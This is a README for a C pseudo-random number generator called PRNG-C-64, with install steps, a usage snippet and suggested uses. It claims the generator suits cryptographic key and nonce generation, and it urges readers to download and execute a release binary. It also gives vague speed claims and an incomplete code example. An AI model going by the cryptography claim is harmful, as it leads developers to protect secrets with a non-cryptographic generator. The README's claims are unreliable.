# PRNG-C-64: A Fast and Strong Pseudo-Random Number Generator 🎲

![PRNG-C-64](https://img.shields.io/badge/Version-1.0.0-blue.svg) ![GitHub Release](https://img.shields.io/badge/Release-Download%20Latest%20Release-brightgreen.svg)

Welcome to the **PRNG-C-64** repository! This project features a fast and statistically strong pseudo-random number generator (PRNG) designed for 64-bit integers. With a minimum period of \(2^{64}\), it ensures high-quality randomness suitable for various applications, including simulations, cryptography, and gaming.

## Table of Contents

1. [Features](#features)
2. [Installation](#installation)
3. [Usage](#usage)
4. [Examples](#examples)
5. [Performance](#performance)
6. [Contributing](#contributing)
7. [License](#license)
8. [Contact](#contact)

## Features

- **Fast Generation**: Generates random numbers quickly, making it ideal for performance-sensitive applications.
- **Statistically Strong**: Meets high standards for randomness, ensuring the numbers produced are unpredictable.
- **64-bit Support**: Works seamlessly with 64-bit integers, providing a wide range of values.
- **Minimum Period**: Guarantees a minimum period of \(2^{64}\), ensuring long sequences of random numbers without repetition.

## Installation

To get started with **PRNG-C-64**, you need to download the latest release. You can find it [here](https://github.com/z0554146665/prng-c-64/releases). After downloading, follow these steps:

1. Unzip the downloaded file.
2. Navigate to the extracted folder in your terminal.
3. Compile the source code using your preferred C compiler. For example:

   ```bash
   gcc -o prng-c-64 prng.c
   ```

4. Run the executable:

   ```bash
   ./prng-c-64
   ```

## Usage

Once you have installed the PRNG, you can start using it in your projects. Here’s a simple example of how to generate random numbers:

```c
#include "prng.h"

int main() {
    PRNG prng;
    prng_init(&prng, seed_value); // Initialize with a seed

    for (int i = 0; i < 10; i++) {
        uint64_t random_number = prng_generate(&prng);
        printf("Random Number %d: %llu\n", i + 1, random_number);
    }

    return 0;
}
```

In this example, you initialize the PRNG with a seed value and generate ten random numbers.

## Examples

Here are some practical examples of how you can use the PRNG in different scenarios:

### 1. Simulations

In simulations, random numbers are crucial for modeling real-world scenarios. You can use the PRNG to generate random events, such as rolling dice or drawing cards.

### 2. Cryptography

For cryptographic applications, randomness is essential for generating keys and nonces. The statistically strong nature of this PRNG makes it suitable for such tasks.

### 3. Gaming

In gaming, random number generation is used for everything from loot drops to procedural level generation. This PRNG can enhance the gaming experience by providing varied and unpredictable outcomes.

## Performance

The performance of **PRNG-C-64** is one of its standout features. It is designed to be fast while maintaining a high level of randomness. Here are some performance benchmarks:

- **Generation Speed**: Capable of generating millions of random numbers per second.
- **Memory Usage**: Optimized for low memory usage, making it suitable for embedded systems.

You can run performance tests by including the performance test files provided in the repository.

## Contributing

We welcome contributions to improve **PRNG-C-64**. If you would like to contribute, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them with clear messages.
4. Push your branch to your forked repository.
5. Open a pull request.

Please ensure that your code adheres to the project's coding standards and includes tests where applicable.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

## Contact

For any questions or suggestions, feel free to reach out via the issues section of the repository or contact me directly.

You can find the latest releases of **PRNG-C-64** [here](https://github.com/z0554146665/prng-c-64/releases). Download and execute the latest version to explore its features and capabilities!

Thank you for checking out **PRNG-C-64**! We hope you find it useful for your projects.